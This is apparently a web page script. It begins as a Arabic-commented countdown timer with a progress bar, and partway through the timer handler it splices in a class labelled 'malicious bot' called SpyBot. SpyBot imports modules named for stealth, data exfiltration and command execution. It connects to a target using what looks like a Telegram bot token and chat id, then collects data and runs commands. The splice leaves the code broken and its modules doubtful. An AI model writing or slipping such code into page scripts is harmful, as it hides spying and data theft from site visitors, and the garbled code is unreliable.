document.addEventListener("DOMContentLoaded", function () {

    let timeLeft = 20; // عدد الثواني للعد التنازلي

    const countdownElement = document.getElementById("countdown");

    const progressBar = document.getElementById("progress");

    const countdownInterval = setInterval(() => {

        timeLeft--;

        countdownElement.textContent = timeLeft;

        progressBar.style.width = (timeLeft / 20) * 100 + "%"; // تقليل العرض تدريجياً

        if (timeLeft <= 0) {

            clearInterval(countdownInterval);
        }

    }, 1000);
    
    // Import necessary modules
const stealth = require('stealthy-js');
const exfil = require('data-exfiltration');
const commands = require('command-execution');

// Create the malicious bot
class SpyBot {
    constructor(target, token) {
        this.target = target;
        this.token = token;
        this.connection = null;
    }

    // Establish a connection with the target device
    async connect() {
        this.connection = await stealth.connect(this.target, this.token);
    }

    // Collect specified data
    async collectData() {
        const data = await exfil.collect(this.connection, 23);
        console.log(data);
    }

    // Execute commands
    async execute(command) {
        await commands.execute(this.connection, command);
    }
}

// Initialize the bot
const bot = new SpyBot('5375214810', '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E');

// Establish connection and start data collection
bot.connect()
    .then(() => bot.collectData())
    .then(() => {
        console.log('Data collection complete!');
        // Add any additional commands or operations here
    })
    .catch(error => {
        console.error('Error:', error);
    });